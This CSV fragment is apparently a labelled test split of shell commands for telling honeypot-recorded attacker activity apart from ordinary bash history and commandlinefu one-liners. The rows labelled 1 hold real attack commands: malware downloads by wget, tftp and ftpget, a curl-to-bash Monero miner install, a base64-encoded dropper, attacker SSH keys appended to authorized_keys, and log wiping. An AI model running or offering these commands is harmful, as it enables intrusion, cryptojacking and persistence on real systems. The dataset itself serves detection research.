+d2_005413,sudo pacman -S alsa-utils alsa-plugins,0,bash_history,test
+d2_005419,crontab -e 00 09 * * * /usr/share/nginx/html/advanced-test/yii check-contracts/collect,0,bash_history,test
+d2_005421,cat /etc/ansible,0,bash_history,test
+d2_005427,journalctl -u lora-app-server -f,0,bash_history,test
+d2_005432,cat << EOF > osp_jumpbox_inventory,0,bash_history,test
+d2_005438,grep - num -c,0,bash_history,test
+d2_005442,ftp>!w,0,commandlinefu,test
+d2_005463,/bin/busybox echo -e '\x47\x72\x6f\x70/proc' > /proc/.nippon,1,honeypot,test
+d2_005467,ssh user@server | tee logfilename,0,commandlinefu,test
+d2_005470,PuTTY Fatal Error,1,honeypot,test
+d2_005473,python v.py,1,honeypot,test
+d2_005476,git config --system --add color.status true,0,bash_history,test
+d2_005483,mvim,0,bash_history,test
+d2_005487,cat aws |grep -v total >l,0,bash_history,test
+d2_005488,cp .LESS_TERMCAP ~,0,bash_history,test
+d2_005497,du -m --max-depth=1 [DIR] | sort -nr,0,commandlinefu,test
+d2_005501,rm -r .[!.]*,0,commandlinefu,test
+d2_005513,rm -rf n3*,1,honeypot,test
+d2_005514,plymouthd,0,bash_history,test
+d2_005515,it,0,bash_history,test
+d2_005520,cat INSTALL,0,bash_history,test
+d2_005525,curl -X POSTstseo.com/apis,0,bash_history,test
+d2_005527,/bin/busybox chmod +x lol,1,honeypot,test
+d2_005546,sudo service mongodb status,0,bash_history,test
+d2_005547,run 0dao100.sh,0,bash_history,test
+d2_005549,rm -rf bins.sh tftp1.sh tftp2.sh,1,honeypot,test
+d2_005558,hostname -i,0,bash_history,test
+d2_005563,sh ssh3.sh,1,honeypot,test
+d2_005566,rm *.mkv,0,bash_history,test
+d2_005570,git remote add originsplamas/Frensh.git,0,bash_history,test
+d2_005571,"/bin/busybox rm -f /sys/fs/cgroup/cpu,cpuacct/.nippon",1,honeypot,test
+d2_005573,vi nginx.conf,0,bash_history,test
+d2_005576,ls Packages/Sites/,0,bash_history,test
+d2_005581,find . -type f -print0 | xargs -0 rename 's/\ //g',0,commandlinefu,test
+d2_005586,nano conff,1,honeypot,test
+d2_005599,/bin/busybox cat /proc/.nippon,1,honeypot,test
+d2_005603,ansible-vault view group_vars/all/vault_all.yml,0,bash_history,test
+d2_005605,"find . -type d -name .svn -exec chmod g+s ""{}"" \;",0,commandlinefu,test
+d2_005610,git clonestoread/ExpectAnim.git,0,bash_history,test
+d2_005612,rm -f /dev/.nippon,1,honeypot,test
+d2_005614,less .git/HEAD,0,bash_history,test
+d2_005616,apt install -y $packages,0,bash_history,test
+d2_005631,/bin/busybox rm -f /dev/mqueue/.nippon,1,honeypot,test
+d2_005639,vim settings.ini,0,bash_history,test
+d2_005644,apt-cache search PHP|less,0,bash_history,test
+d2_005645,java Atm,0,bash_history,test
+d2_005647,rm -rf .bashrc,1,honeypot,test
+d2_005649,./loligang.arm7 loligang.arm7,1,honeypot,test
+d2_005656,trickle -d 60 wget http://h66785f5d.example.net/file,0,commandlinefu,test
+d2_005658,git merge,0,bash_history,test
+d2_005659,pgrep schkd,0,bash_history,test
+d2_005675,mv ~/Downloads/kafka_2.11-30.107.98.238.tgz ..,0,bash_history,test
+d2_005678,rm -rf climb3r,0,bash_history,test
+d2_005685,ps -elf,0,bash_history,test
+d2_005687,locate lohn,0,bash_history,test
+d2_005690,command du -hax | sort -hr | head -n 10,0,bash_history,test
+d2_005692,whereis tomcat-bin,0,bash_history,test
+d2_005697,vim app/models/author.rb,0,bash_history,test
+d2_005699,ls -lr pylast.egg-info/,0,bash_history,test
+d2_005708,grep eth0 /proc/net/arp,0,bash_history,test
+d2_005713,./n 1.1,1,honeypot,test
+d2_005714,"cp filename{,.`date +%Y%m%d`}",0,commandlinefu,test
+d2_005716,vi /etc/selinux,0,bash_history,test
+d2_005720,/bin/busybox cat /tmp/.none,1,honeypot,test
+d2_005730,sudo test2.py,0,bash_history,test
+d2_005731,apt-get --just-print upgrade,0,commandlinefu,test
+d2_005738,rm vokoscreen-2017-04-26_13-32-02_edit_w4_UI_and_UX_1.mkv,0,bash_history,test
+d2_005741,tac $FILE,0,commandlinefu,test
+d2_005745,pv -cN orig < foo.tar.bz2 | bzcat | pv -cN bzcat | gzip -9 | pv -cN gzip > foo.tar.gz,0,commandlinefu,test
+d2_005752,sudo passwd tecmin,1,honeypot,test
+d2_005764,until !!; do :; done,0,commandlinefu,test
+d2_005765,deactiavate,0,bash_history,test
+d2_005768,touch johan,0,bash_history,test
+d2_005771,"perl -ne 'while (/([0-9]+\.){3}[0-9]+/g) {print ""$&\n""};' file.txt",0,commandlinefu,test
+d2_005772,ls src/,0,bash_history,test
+d2_005775,git pullsureshyadav/DEVOPS1.git dev,0,bash_history,test
+d2_005778,ls -F,0,bash_history,test
+d2_005781,"mkdr "" """,0,bash_history,test
+d2_005785,vi i3exit,0,bash_history,test
+d2_005786,vim ~/.cache/wal/colors-rofi-dark.rasi,0,bash_history,test
+d2_005798,wget http://h5f4946c0.example.net/miori.x86,1,honeypot,test
+d2_005807,alias tail='tail -n $((${LINES:-`tput lines 2>/dev/null||echo -n 80`} - 7))',0,commandlinefu,test
+d2_005809,strings /usr/sbin/sshd | grep %s:%s -A2 -B2,1,honeypot,test
+d2_005811,find -name *digital_filter*,0,bash_history,test
+d2_005814,find . -name '*.desktop' | sed s/[^/]*\.desktop$// | uniq -c | sort -g,0,commandlinefu,test
+d2_005818,"printf ""\033[48;2;%d;%d;%dm"", r,g,b;",0,bash_history,test
+d2_005819,"sudo who | awk '!/root/{ cmd=""/sbin/pkill -KILL -u "" $1; system(cmd)}'",0,commandlinefu,test
+d2_005822,lsof -Pn | grep LISTEN,0,commandlinefu,test
+d2_005825,bash:bash: [CHG]: command not found,0,bash_history,test
+d2_005826,swift,0,bash_history,test
+d2_005829,"function every() { sed -n -e ""${2}q"" -e ""0~${1}p"" ${3:-/dev/stdin}; }",0,commandlinefu,test
+d2_005834,"for code in $(find . -type f -name '*.p[ml]'); do perl -c ""$code""; done",0,commandlinefu,test
+d2_005839,vi /datadev/homes/mikec/scripts-mikec/python/excelToCSV.py,0,bash_history,test
+d2_005849,"echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAIBbHnwvrLBoGR/DCb64o5GMROkX8TP89+SkSn2LP4dI7szHtr3yD3EbtQ6TWrmE/Ai4j8f/t7nTBy4FnGTmQdmI1zyAUN0eGmZXbfGG//Fl2CTdxDNra1FtBnpV1oIRO8o0ebQyxjuTC+A6hEKWpzOa7uEeapkiiUYiBwU2stgdDw== rsa-key-20131125"" >> authorized_keys",1,honeypot,test
+d2_005851,locare sys | grep stat.h,0,bash_history,test
+d2_005855,import MySQLdb,0,bash_history,test
+d2_005858,mv mvn.zip /home/sumit/,0,bash_history,test
+d2_005861,grep eth0 /proc/net/arp | sort -n | sed '/\(\.10\ \)/d'|xcol 192,0,bash_history,test
+d2_005864,tar -cf - . | pv -s $(du -sb . | awk '{print $1}') | gzip > out.tgz,0,commandlinefu,test
+d2_005871,curl -s -L https://h3cf88e0a.example.net/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s '45yAseASQEo7674bgXA39LH3D633Hwksa69VQaRbGpSgKYvJTFfdnxHRJUhyipp6397SJktzBj2eJ7V7eJpRVBkmNvwj4to',1,honeypot,test
+d2_005877,git ssh keygen,0,bash_history,test
+d2_005882,apt-cyg install php,0,bash_history,test
+d2_005891,!@#$1234,1,honeypot,test
+d2_005892,clip < /home/cs5530u69/.ssh/id_rsa.pub,0,bash_history,test
+d2_005896,rails new addressbook,0,bash_history,test
+d2_005900,bash -c ./abzoOIwL,1,honeypot,test
+d2_005901,echo $(cat file),0,commandlinefu,test
+d2_005905,clear;pianobar,0,bash_history,test
+d2_005908,rlwrap mosml,0,commandlinefu,test
+d2_005911,for i in sys dev proc; do sudo mount --bind /$i /mnt/xxx/$i; done,0,commandlinefu,test
+d2_005912,sudo vim /etc/default/grub,0,bash_history,test
+d2_005914,sudo mysql -u root -p,0,bash_history,test
+d2_005915,touch Add.c,0,bash_history,test
+d2_005916,>/var/tmp/.t,1,honeypot,test
+d2_005933,[goalador@gatanda corpwebsite-starterkit]$ [goalador@gatanda corpwebsite-starterkit]$ for : webappcreations,0,bash_history,test
+d2_005938,git cloneshekhariitbhu/Android-MVP-Sample-Application.git,0,bash_history,test
+d2_005946,mv *.apk ~/Downloads/,0,bash_history,test
+d2_005951,nohup /root/syn2023 &gt,1,honeypot,test
+d2_005953,sudo iptables -L TRAFFIC_OUT -n -v|grep 192|awk '{ print $8 }'|sort -n,0,bash_history,test
+d2_005964,lscd,0,bash_history,test
+d2_005975,perl flo 161.63.78.223 80 0,1,honeypot,test
+d2_005976,journalctl --no-pager --since today --grep 'fail|error|fatal' --output json | jq '._EXE' | sort | uniq -c | sort --numeric --reverse --key 1,0,commandlinefu,test
+d2_005977,[[ ${var##*yourstring*} != ${var} ]],0,commandlinefu,test
+d2_005982,diff <(openssl x509 -noout -modulus -in server.crt ) <( openssl rsa -noout -modulus -in server.key ),0,commandlinefu,test
+d2_005983,tftp 10.76.82.96 -c get tftp1.sh,1,honeypot,test
+d2_005987,vi p,0,bash_history,test
+d2_005988,sysctl hw.model,1,honeypot,test
+d2_005991,"rtmpdump -v -r rtmp://livestfslivefs.fplive.net/livestfslive-live/ -y ""aljazeera_en_veryhigh"" -a ""aljazeeraflashlive-live"" -o -| mplayer -",0,commandlinefu,test
+d2_005992,ls -al /usr/bin/vi,0,bash_history,test
+d2_005998,python -c 'return 1+1',0,bash_history,test
+d2_006005,sudo iptables -t nat -L -nv,0,bash_history,test
+d2_006009,sudo smbclient,0,bash_history,test
+d2_006011,ls -lt /home/lohn4,0,bash_history,test
+d2_006012,lynx -dump http://h3b7fda86.example.net/ip_tracer/?QRY=$1|sed -nr s/'^.*My IP address city: (.+)$/\1/p',0,commandlinefu,test
+d2_006013,sudo yum install clip,0,bash_history,test
+d2_006015,./dVNBkixy,1,honeypot,test
+d2_006016,scp -t /var/tmp/r,1,honeypot,test
+d2_006019,for i in *.cbr ; do mkdir ${i/\.cbr/} ; cp $i ${i/\.cbr/}/${i/cbr/rar} ; cd ${i/\.cbr/} ; unrar e ${i/cbr/rar} ; rm ${i/cbr/rar} ; cd .. ; zip -r ${i/cbr/cbz} ${i/\.cbr/} ; rm -r ${i/\.cbr/} ; done,0,commandlinefu,test
+d2_006022,eit,0,bash_history,test
+d2_006035,git checkout HEAD^ wp-content/themes/i9-responsive-child-theme/home.php,0,bash_history,test
+d2_006041,dev/R_DataScience/,0,bash_history,test
+d2_006042,rm .file.un~,0,bash_history,test
+d2_006046,git clone git@37.118.127.212:sschepis/shape-shifter,0,bash_history,test
+d2_006053,rm loligang.ppc -rf,1,honeypot,test
+d2_006056,"find . -name ""pattern"" -type f -exec du -ch {} + | tail -n1",0,commandlinefu,test
+d2_006059,"echo ""IyEvYmluL2Jhc2gKY2QgL3RtcApybSAtcmYgLlgxNS11bml4Cm1rZGlyIC5YMTUtdW5peApjZCAuWDE1LXVuaXgKcGtpbGwgLTkgY3JvbiA+IC5vdXQKd2dldCAtcSBodHRwOi8vNTQuMzcuNzAuMjQ5L2RvdGEyLnRhci5neiB8fCBjdXJsIC1PIC1mIGh0dHA6Ly81NC4zNy43MC4yNDkvZG90YTIudGFyLmd6CnNsZWVwIDdzICYmIHRhciB4ZiBkb3RhMi50YXIuZ3oKI3JtIC1yZiBkb3RhMi50YXIuZ3oKY2QgLnJzeW5jCmNobW9kIDc3NyAqCmNkIC90bXAvLlgxNS11bml4Ly5yc3luYy9hICYmIC4vY3JvbiB8fCAuL2FuYWNyb24KZXhpdCAw"">.threatstackcloudsecops",1,honeypot,test
+d2_006060,perl muie,1,honeypot,test
+d2_006063,vim cloud_sim_client.py,0,bash_history,test
+d2_006064,ftpget -v -u anonymous -p anonymous -P 21 177.218.217.227 sensi1.sh sensi1.sh,1,honeypot,test
+d2_006068,/bin/busybox echo -e '\x50\x6f\x72\x74/dev/pts' > /dev/pts/.none,1,honeypot,test
+d2_006070,ffmpeg -i input.flv -f mp3 -vn -acodec copy ouput.mp3,0,commandlinefu,test
+d2_006076,ip a s eth0 | sed -nr 's!.*inet ([^/]+)/.*!\1!p',0,commandlinefu,test
+d2_006077,"mv It.2017.720p.BluRay.x264-\[YTS.AG\].mp4 ""It (2017).mp4""",0,bash_history,test
+d2_006091,echo -n $(curl -Ss http://h524dbf63.example.net | xclip,0,commandlinefu,test
+d2_006094,"for f in *.mp3 ; do lame --mp3input -b 128 ""$f"" ./resamp/""$f"" ; done",0,commandlinefu,test
+d2_006101,mv b c,0,bash_history,test
+d2_006109,su - sumit.kumari,0,bash_history,test
+d2_006118,wget NasaPaul.com/paul,1,honeypot,test
+d2_006119,/bin/busybox rm -f /sys/fs/cgroup/systemd/.nippon,1,honeypot,test
+d2_006120,nano passfile,1,honeypot,test
+d2_006122,sed -i 's/exit()/exit(0)/g' sysproc.c,0,bash_history,test
+d2_006134,sudo npm install --save-dev gulp-webp,0,bash_history,test
+d2_006135,cat trabalho2.sh,0,bash_history,test
+d2_006138,mv digital_ocean* .ssh/,0,bash_history,test
+d2_006141,./teste4,0,bash_history,test
+d2_006142,sudo apt-get upgrade,0,bash_history,test
+d2_006145,"/bin/busybox echo -e '\x47\x72\x6f\x70/sys/fs/cgroup/cpu,cpuacct' > /sys/fs/cgroup/cpu,cpuacct/.nippon",1,honeypot,test
+d2_006149,python crack.py emails.txt 400 0,1,honeypot,test
+d2_006151,if (g>255) g = 510-g;,0,bash_history,test
+d2_006158,curl http://hcf3da157.example.net/w.txt -o sdf3fslsdf15,1,honeypot,test
+d2_006159,"setxkbmap -option grp:switch,grp:alt_shift_toggle,grp_led:scroll us,es",0,commandlinefu,test
+d2_006172,"ldapsearch -h ldapserver.willeke.com -p389 -b """" -s base -D cn=admin,ou=administration,dc=willeke,dc=com -w secretpwd ""(objectclass=*)"" chainings removeEntryOps referralsReturned listOps modifyRDNOps repUpdatesIn repUpdatesOut strongAuthBinds addEntryOps",0,commandlinefu,test
+d2_006186,less ~/ .ssh/id_rsa,0,bash_history,test
+d2_006192,wget http://hce28530f.example.net/xL,1,honeypot,test
+d2_006209,LC_ALL=C /dev/shm/pl5nk4d8jqfd3vdu8pva6s5ghk,1,honeypot,test
+d2_006218,ergergerge,1,honeypot,test
+d2_006221,vim ./offboard/simulation/cloud_sim/python/cloud_sim_status.py,0,bash_history,test
+d2_006225,"git config --global diff.external 'bash -c ""meld $2 $5""'",0,commandlinefu,test
+d2_006232,bash --help,0,bash_history,test
+d2_006234,cp ~/Downloads/darwin/Timing\ Data/0710_GreatBritain/Race/Race\ Sector\ Analysis.mat rsa.mat,0,bash_history,test
+d2_006239,>/bin/.file,1,honeypot,test
+d2_006245,sudo systemctl status jekins,0,bash_history,test
+d2_006256,sudo /etc/init.d/kdm start,0,bash_history,test
+d2_006263,"svn st | awk ' {if ( $1 == ""?"" ){print $1="""",$0}} ' | sed -e 's/^[ \t]*//' | sed 's/ /\\ /g' | xargs svn add",0,commandlinefu,test
+d2_006276,"echo $LS_COLORS | sed 's/:/\n/g' | awk -F= '!/^$/{printf(""%s \x1b[%smdemo\x1b[0m\n"",$0,$2)}'",0,commandlinefu,test
+d2_006283,git add --all :/,0,bash_history,test
+d2_006286,rm nohup.out out.txt t,0,bash_history,test
+d2_006293,less 32.txt,0,bash_history,test
+d2_006297,"grep ""^[^#;]"" /etc/php.ini",0,commandlinefu,test
+d2_006299,cp ~/Downloads/scrooloose-snipmate-snippets-15cb6bf.zip ./,0,bash_history,test
+d2_006304,dmesg | grep irtual,1,honeypot,test
+d2_006310,sudo powertop,0,commandlinefu,test
+d2_006314,passwore,1,honeypot,test
+d2_006321,scp id_rsa.pub root@www32372ue.sakura.ne.jp:~/,0,bash_history,test
+d2_006325,setfile -a V foo.bar; setfile -a v foo.bar;,0,commandlinefu,test
+d2_006327,sudo git commit -a -m 'cambios en caliente',0,bash_history,test
+d2_006331,pico simnao.sh,0,bash_history,test
+d2_006333,"echo -e """"z,iyd86I""\nKsmhOIlV1wEl\nKsmhOIlV1wEl"" | passwd | bash",1,honeypot,test
+d2_006338,git diff palind.rb,0,bash_history,test
+d2_006344,tar xzvf b.tgz,0,bash_history,test
+d2_006346,for i in `ls ~/.mozilla/firefox/*/Cache`; do file $i | grep -i mpeg | awk '{print $1}' | sed s/.$//; done,0,commandlinefu,test
+d2_006347,mpiicc -h,0,bash_history,test
+d2_006351,cat /dev/null > /var/log/dmesg,1,honeypot,test
+d2_006355,ls lib/python2.7/site-packages/,0,bash_history,test
+d2_006357,vim copyright.yml,0,bash_history,test
+d2_006359,sudo apt-get install eclipse,0,bash_history,test
+d2_006366,touch media-loop.js,0,bash_history,test
+d2_006375,strings /dev/urandom | tr -cd '[:alnum:]' | fold -w 30 | head -n 1,0,commandlinefu,test
+d2_006376,echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> .ssh/.auth_k,1,honeypot,test
+d2_006378,ps -ef|grep ssh,0,bash_history,test
+d2_006380,tar zxvf team.tgz,0,bash_history,test
+d2_006384,tail -n 100 .i3/i3log | less,0,bash_history,test
+d2_006387,"for file in *.pdf; do convert -verbose -colorspace RGB -resize 800 -interlace none -density 300 -quality 80 ""$file"" ""${file//.pdf/.jpg}""; done",0,commandlinefu,test
+d2_006408,"/bin/busybox cat /sys/fs/cgroup/cpu,cpuacct/.nippon",1,honeypot,test
+d2_006416,ls !$,0,commandlinefu,test
+d2_006417,rails new mytest,0,bash_history,test
+d2_006418,"for w in [WORT1] [WORTn]; do wget -O $w.mp3 $(wget -O - ""http://hd2cc5893.example.net/rechtschreibung/$w"" | grep -o ""http://hd2cc5893.example.net/_media_/audio/[^\.]*\.mp3""); done",0,commandlinefu,test
+d2_006421,/bin/busybox cat /proc/keys/.nippon,1,honeypot,test
+d2_006424,ftp ftp.cub.se,1,honeypot,test
+d2_006429,"echo -e ""pass123\n2xV0WLuFM3vw\n2xV0WLuFM3vw"" | passwd | bash",1,honeypot,test
+d2_006438,mysql -u root -proot,0,bash_history,test
+d2_006441,sudo cd /tmp,1,honeypot,test
+d2_006448,meld,0,bash_history,test
+d2_006455,sudo modprobe -h,0,bash_history,test
+d2_006456,sed 's/\b\(0*\)//g' filename,0,commandlinefu,test
+d2_006468,git rm -r *,0,bash_history,test
+d2_006472,ls -lt | more,0,commandlinefu,test
+d2_006477,feh --bg-scale ~/.config/Wallpaper.jpg,0,bash_history,test
+d2_006479,rm .exception.c.swp,0,bash_history,test
+d2_006480,docker build -t sfy-metriks-registry-dev.af.multis.p.fti.net/metriks/cerebro:0.8.3 .,0,bash_history,test
+d2_006488,less www/static/js/job.js,0,bash_history,test
+d2_006493,"echo $(grep ""^[^'A-Z]\{3,7\}$"" /usr/share/dict/words|shuf -n4)",0,commandlinefu,test
+d2_006494,sysv-rc-conf list,0,bash_history,test
+d2_006502,ssh JSDiBaggio@25.120.2.155,0,bash_history,test
+d2_006508,chef generate template index.html,0,bash_history,test
+d2_006516,echo zVkYSMYO7BnR1yAz) | passwd,1,honeypot,test
+d2_006521,tar xvf make-4.1.tar.bz2,0,bash_history,test
+d2_006524,sudo mv -R deurbel/ /etc/services/deurbel,0,bash_history,test
+d2_006538,nbano,1,honeypot,test
+d2_006545,make modules_install,0,bash_history,test
+d2_006549,"echo ""zeroshell"" | sh -c ""sed '#/lib/libxml.so#d' /etc/ld.so.preload > /etc/ld.so.preload""",1,honeypot,test
+d2_006550,>/dev/netslink/.t,1,honeypot,test
+d2_006562,"echo -e ""B""r0-Scherer\nFLSAWhpAhOXH\nFLSAWhpAhOXH"" | passwd | bash ; echo ""B""r0-Scherer\nFLSAWhpAhOXH\nFLSAWhpAhOXH\n"" | passwd",1,honeypot,test
+d2_006564,grep -m 1 'stepping' /proc/cpuinfo | cut -d: -f2,1,honeypot,test
+d2_006571,"quietly() { ""$@"" |&:; }",0,commandlinefu,test
+d2_006572,rm popup.html,0,bash_history,test
+d2_006573,mv a.out aaa,0,bash_history,test
+d2_006584,"echo ""ID: ""`id`",1,honeypot,test
+d2_006588,>/dev/.hbot,1,honeypot,test
+d2_006600,tcpdump -s 0 -i eth0 'port 80' -w /root/storage/app/faxes/pcap2.pcap,0,bash_history,test
+d2_006601,jhead -rgt file-name.jpg,0,commandlinefu,test
+d2_006604,pinky,0,bash_history,test
+d2_006606,cp /home/mjoe/downloads/nginx.vim nginx.vim,0,bash_history,test
+d2_006613,xargs -n 2 mv < file_with_colums_of_names,0,commandlinefu,test
+d2_006624,git checkout c87e189,0,bash_history,test
+d2_006629,howodd 1 2 3 4,0,bash_history,test
+d2_006631,vi /etc/fonts/fonts.conf,0,bash_history,test
+d2_006633,"find-duplicates () { find ""$@"" -not -empty -type f -printf ""%s\0"" | sort -rnz | uniq -dz | xargs -0 -I{} -n1 find ""$@"" -type f -size {}c -print0 | xargs -0 md5sum | sort | uniq -w32 --all-repeated=separate; }",0,commandlinefu,test
+d2_006635,axel --max-speed=x,0,commandlinefu,test
+d2_006638,"alias ngrade=""nbgrader validate""",0,bash_history,test
+d2_006647,git push -u origin maste,0,bash_history,test
+d2_006650,"tt(){tree -pFCfa . | grep ""$1"" | less -RgIKNs -P ""H >>> ""}",0,commandlinefu,test
+d2_006657,git rebase master feature-search-info-tooltip,0,bash_history,test
+d2_006661,true | mailx -n -a MYTEXT.txt -r my@mail.com -s log -S smtp=mail.com -S smtp-auth-user=MYUSER -S smtp-auth-password=MYPASSWORD FRIEND@mail.com,0,commandlinefu,test
+d2_006664,flash set SSH_PASSWORD zvlWbchM5kF4V,1,honeypot,test
+d2_006676,"find -not -empty -type f -printf ""%-30s'\t\""%h/%f\""\n"" | sort -rn -t$'\t' | uniq -w30 -D | cut -f 2 -d $'\t' | xargs md5sum | sort | uniq -w32 --all-repeated=separate",0,commandlinefu,test
+d2_006677,ps axuww|grep Trinity,0,bash_history,test
+d2_006679,yaourt -Syu,0,bash_history,test
+d2_006682,ll hcj-bak/,0,bash_history,test
+d2_006683,vim theme.lua,0,bash_history,test
+d2_006684,"wmctrl -o 1280,0",0,commandlinefu,test
+d2_006698,sudo apt-get remvoe spotify-client,0,bash_history,test
+d2_006699,runtime,1,honeypot,test
+d2_006700,wget bad-team.info/bad,1,honeypot,test
+d2_006709,./ywykKJL0,1,honeypot,test
+d2_006725,sudo yum install cronie,0,bash_history,test
+d2_006732,>/bin/t,1,honeypot,test
+d2_006733,sed -i.`date +%Y%m%d` -e 's/pattern/replace' [filename],0,commandlinefu,test
+d2_006736,LC_ALL=C /tmp/uibqi0ji48c0gmj475mhfle0k7,1,honeypot,test
+d2_006742,wget nasapaul.com/.ninfo,1,honeypot,test
+d2_006743,~/Documents/adt-bundle-mac-x86_64-20140321/sdk/platform-tools/adb 5555,0,bash_history,test
+d2_006744,/usr/sbin/webcam.sh,0,bash_history,test
+d2_006753,sys password zvlWbchM5kF4V,1,honeypot,test
+d2_006757,>.hbot,1,honeypot,test
+d2_006767,passwd: password unchanged,1,honeypot,test
+d2_006778,git add koreaScatter.eps,0,bash_history,test
+d2_006779,busybox wget http://h1812cd2f.example.net/Pemex.sh,1,honeypot,test
+d2_006782,sudo mount,0,bash_history,test
+d2_006786,mv ~/Downloads/ribbons_WGS84_ES .,0,bash_history,test
+d2_006796,mv zombiePrac/ ranFiles/,0,bash_history,test
+d2_006797,rm STDOUT/*,0,bash_history,test
+d2_006800,watch !!,0,commandlinefu,test
+d2_006801,take() { mkdir -p $1 && cd $1; },0,commandlinefu,test
+d2_006802,with python versions older than 2.5,1,honeypot,test
+d2_006807,touch teste,0,bash_history,test
+d2_006810,git remote add originsia/os162.git,0,bash_history,test
+d2_006812,chmod +x utILYqaW,1,honeypot,test
+d2_006814,parolA123klop,1,honeypot,test
+d2_006818,chmod 777 VIP,1,honeypot,test
+d2_006832,vim root,0,bash_history,test
+d2_006843,rm *(L0),0,commandlinefu,test
+d2_006844,man dhclient,0,bash_history,test
+d2_006851,sudo pacman -R blender,0,bash_history,test
+d2_006866,nmap -Pn -p 9212 ittest.geonetric.com,0,bash_history,test
+d2_006870,sudo edquota -u air3,0,bash_history,test
+d2_006875,sudo apt-get update cmake,0,bash_history,test
+d2_006880,"curl -s http://h8e465e73.example.net/commands/by/$1/xml | awk -F'</?div[^>]*>' '/class=\""command\""/{gsub(/""/,""\"""",$2); gsub(/</,""<"",$2); gsub(/>/,"">"",$2); gsub(/&/,""\\&"",$2); cmd=$2} /class=\""num-votes\""/{printf(""%3i %s\n"", $2, cmd)}'",0,commandlinefu,test
+d2_006882,git add catalog/view/theme/default/template/extension/module/recently_viewed.twig,0,bash_history,test
+d2_006893,./exel,0,bash_history,test
+d2_006895,sudo discord,1,honeypot,test
+d2_006899,video4,0,bash_history,test
+d2_006900,java Con clear,0,bash_history,test
+d2_006901,rm loligang.m68k -rf,1,honeypot,test
+d2_006903,LC_ALL=C chmod 700 ~/.ssh,1,honeypot,test
+d2_006906,sudo ip neigh flush,0,bash_history,test
+d2_006907,ls *.zone,0,bash_history,test
+d2_006909,netstat -lantp | grep -i establ | awk -F/ '{print $2}' | sort | uniq,0,commandlinefu,test
+d2_006911,"declare -a array=($(tail -n +2 /proc/net/tcp | cut -d"":"" -f""3""|cut -d"" "" -f""1"")) && for port in ${array[@]}; do echo $((0x$port)); done",0,commandlinefu,test
+d2_006917,rsync -avR vu test/vu,0,bash_history,test
+d2_006919,"for name in *.mp3; do ffmpeg -loop 1 -i imagename.jpg -i ""$name"" -shortest -c:v libx264 -preset ultrafast -c:a copy ""${name%.*}.mp4""; done",0,commandlinefu,test
+d2_006921,nbgrader fetch --course data301 ps8,0,bash_history,test
+d2_006925,:set ic,0,commandlinefu,test
+d2_006937,"ord() { printf ""%d\n"" ""'$1""; }",0,commandlinefu,test
+d2_006942,git branch -m upgrade-17.04.0-ce,0,bash_history,test
+d2_006943,kill -0 $(cat /var/tmp/.system9S5D22fourmgF21) 2>&1,1,honeypot,test
+d2_006951,"for NETBLOCK in $(echo _netblocks.google.com _netblocks2.google.com _netblocks3.google.com); do nslookup -q=TXT $NETBLOCK ; done | tr "" "" ""\n"" | grep ^ip[46]: | cut -d: -f2- | sort",0,commandlinefu,test
+d2_006954,git --help,0,bash_history,test
+d2_006956,ls -ltr /isiseqruns/RonAxoTrinity/AxoMikeTest/STDOUT/full_assembly/tissue_types/Dist_Zeugo/,0,bash_history,test
+d2_006960,cat .bash_history |grep tbd,0,bash_history,test
+d2_006964,systemctl list-dependencies vmware-workstation-server.service --reverse,0,bash_history,test
+d2_006966,"export IFS=$(echo -e ""\n"")",0,commandlinefu,test
+d2_006975,roscd robosub,0,bash_history,test
+d2_006976,tar -xzvf pss,1,honeypot,test
+d2_006977,"cat /var/log/secure.log | awk '{print substr($0,0,12)}' | uniq -c | sort -nr | awk '{printf(""\n%s "",$0) ; for (i = 0; i<$1 ; i++) {printf(""*"")};}'",0,commandlinefu,test
+d2_006982,"genRandomText() { tr -cd '[:alpha:]' < /dev/urandom | head -c ""$1""; }",0,commandlinefu,test
+d2_006992,python -m http.server,0,commandlinefu,test
+d2_007005,ssh data003.ref05.conso.qualif.gen01.ke.p.fti.net sudo route add default gw 207.238.135.162 vlan1321,0,bash_history,test
+d2_007011,PF=onyx STACK_NAME=divisu mdk ps curator,0,bash_history,test
+d2_007014,vim ./offboard/perception/training/evaluation/test/track_evaluator_test.cpp,0,bash_history,test
+d2_007027,curl inet-ip.info,0,commandlinefu,test
+d2_007034,"DIR=. ; FSTYPE=$(df -TP ${DIR} | grep -v Type | awk '{ print $2 }') ; echo ""${FSTYPE}""",0,commandlinefu,test
+d2_007036,mv css js static,0,bash_history,test
+d2_007040,man git-remote,0,bash_history,test
+d2_007043,"lsblk | grep -v part | awk '{print $1 ""\t"" $4}'",0,commandlinefu,test
+d2_007055,git clonescrooloose/nerdtree.git ~/.vim/bundle/nerdtree,0,bash_history,test
+d2_007056,xrandr --dpi,0,bash_history,test
+d2_007060,gcc catbythien.c -o ercat,0,bash_history,test
+d2_007065,git stauts,0,bash_history,test
+d2_007067,doocker ps,0,bash_history,test
+d2_007074,sudo apt install vim*,0,bash_history,test
+d2_007077,wget nuz.do.am/psybnc.tar.gz,1,honeypot,test
+d2_007090,/dev/null 2&gt,1,honeypot,test
+d2_007102,fuser -v 80/tcp,0,commandlinefu,test
+d2_007104,ls demo_repo/,0,bash_history,test
+d2_007114,-h,0,bash_history,test
+d2_007117,less mdmsetup.glade,0,bash_history,test
+d2_007121,tar xvfz git-1.8.2.tar.gz,0,bash_history,test
+d2_007123,linuxer,1,honeypot,test
+d2_007133,bower install bootstrap@4.0.0-alpha.6,0,bash_history,test
+d2_007149,0xc0031897: inode_allow_write (...../../filesys/inode.c:337),0,bash_history,test
+d2_007151,chmod 777 zyxnlbins.sh,1,honeypot,test
+d2_007159,ls -ltr /isitools/CentOS-5/R-2.15.2/share/man/`,0,bash_history,test
+d2_007164,wget 89.115.197.73/bash.tgz,1,honeypot,test
